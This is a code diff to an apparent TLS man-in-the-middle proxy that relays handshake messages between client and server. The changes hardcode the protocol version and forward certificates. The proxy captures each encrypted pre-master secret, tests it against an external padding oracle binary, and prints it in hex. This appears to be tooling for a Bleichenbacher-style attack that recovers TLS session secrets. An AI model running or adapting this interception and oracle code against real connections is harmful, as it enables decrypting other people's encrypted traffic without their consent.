@@ -22,7 +22,7 @@ def handshakeProxy(c_conn, s_conn, oracle):
         else: break
     clientHello = result
 
-    c_conn.version = clientHello.client_version
+    c_conn.version = (3, 1) # TODO : Hardcoded version ?
 
     for result in c_conn._sendMsg(clientHello):
         yield result
@@ -45,13 +45,26 @@ def handshakeProxy(c_conn, s_conn, oracle):
     # CERTIFICATE           S -> C
     for result in c_conn._getMsg(ContentType.handshake,
                            HandshakeType.certificate,
-                           serverHello.certificate_type):
+                           serverHello.certificate_type): # FIXME : we should only allow RSA
         if result in (0,1): yield result
         else: break
-    certificate = result
+    serverCertificate = result
 
-    for result in s_conn._sendMsg(certificate):
+    for result in s_conn._sendMsg(serverCertificate):
         yield result
+
+
+    # TODO : this part is optional
+    # CERTIFICATE REQUEST   S -> C
+    for result in c_conn._getMsg(ContentType.handshake,
+                           HandshakeType.certificate_request):
+        if result in (0,1): yield result
+        else: break
+    certificate_request = result
+
+    for result in s_conn._sendMsg(certificate_request):
+        yield result
+
 
     # SERVER HELLO DONE     S -> C
     for result in c_conn._getMsg(ContentType.handshake,
@@ -62,6 +75,19 @@ def handshakeProxy(c_conn, s_conn, oracle):
 
     for result in s_conn._sendMsg(serverHelloDone):
         yield result
+
+    # TODO : this part is optional
+    # CERTIFICATE           C -> S
+    for result in s_conn._getMsg(ContentType.handshake,
+                           HandshakeType.certificate,
+                           serverHello.certificate_type): # FIXME : we should allow anything ?
+        if result in (0,1): yield result
+        else: break
+    clientCertificate = result
+
+    for result in c_conn._sendMsg(clientCertificate):
+        yield result
+
 
     # CLIENT KEY EXCHANGE   C -> S
     for result in s_conn._getMsg(ContentType.handshake,
@@ -75,7 +101,10 @@ def handshakeProxy(c_conn, s_conn, oracle):
     epms = clientKeyExchange.encryptedPreMasterSecret
     if not oracle(epms):
         # YOU SHALL NOT PASS !
+        print("You shall not pass")
         return
+
+    print("Found trimmer !")
 
     print(hexlify(epms).decode())
 
@@ -110,9 +139,9 @@ if __name__ == "__main__":
 
     # Get parameters
     listenaddr, connectaddr, oracleaddr, cert = sys.argv[1:]
-    listenaddr = (listenaddr.split(':')[0], int(listenaddr.split(':')[1]))
-    connectaddr = (connectaddr.split(':')[0], int(connectaddr.split(':')[1]))
-    oracleaddr = (oracleaddr.split(':')[0], int(oracleaddr.split(':')[1]))
+    listenaddr = (listenaddr.rsplit(':', 1)[0], int(listenaddr.rsplit(':', 1)[1]))
+    connectaddr = (connectaddr.rsplit(':', 1)[0], int(connectaddr.rsplit(':', 1)[1]))
+    oracleaddr = (oracleaddr.rsplit(':', 1)[0], int(oracleaddr.rsplit(':', 1)[1]))
 
     oracle = lambda epms: not subprocess.call(["./trimmable", '{}:{}'.format(*oracleaddr), cert, hexlify(epms)])
 
